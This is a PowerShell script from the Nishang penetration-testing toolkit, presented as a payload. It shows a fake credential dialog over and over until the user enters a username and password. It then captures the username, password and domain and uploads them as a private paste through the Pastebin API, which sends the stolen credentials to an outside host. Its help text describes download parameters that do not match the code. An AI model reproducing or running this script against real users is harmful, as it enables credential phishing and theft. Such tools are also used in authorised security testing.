<#
.SYNOPSIS
Nishang Payload which opens a user credential prompt

.DESCRIPTION
This payload opens a prompt which asks for user credentials and
does not go away till something is entered in the box.

.PARAMETER URL
The URL from where the file would be downloaded.

.PARAMETER FileName
Name of the file where download would be saved.

.EXAMPLE
PS > Download http://example.com/file.txt $env:temp\newfile.txt

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>



Param ( [Parameter(Position = 0, Mandatory = $True)] [String] $dev_key,
[Parameter(Position = 1, Mandatory = $True)] [String]$username,
[Parameter(Position = 2, Mandatory = $True)] [String]$password )

function Credentials
{
while(1)
{
#start-sleep -seconds 1
$credential = $host.ui.PromptForCredential("Need credentials", "Please enter your user name and password.", "", "")
if($credential)
{
$creds = $credential.GetNetworkCredential()
[String]$user = $creds.username
[String]$pass = $creds.password
[String]$domain = $creds.domain
$pastevalue = "Username: " + $user + " Password: " + $pass + " Domain:" + $domain
break
}
}

Function Post_http($url,$parameters){
$http_request = New-Object -ComObject Msxml2.XMLHTTP
$http_request.open('POST', $url, $false)
$http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded")
$http_request.setRequestHeader("Content-length", $parameters.length);
$http_request.setRequestHeader("Connection", "close")
$http_request.send($parameters)
$script:session_key=$http_request.responseText 
}
Post_http "http://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password"
Post_http "http://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=creds&api_paste_code=$pastevalue&api_paste_private=2"
}
Credentials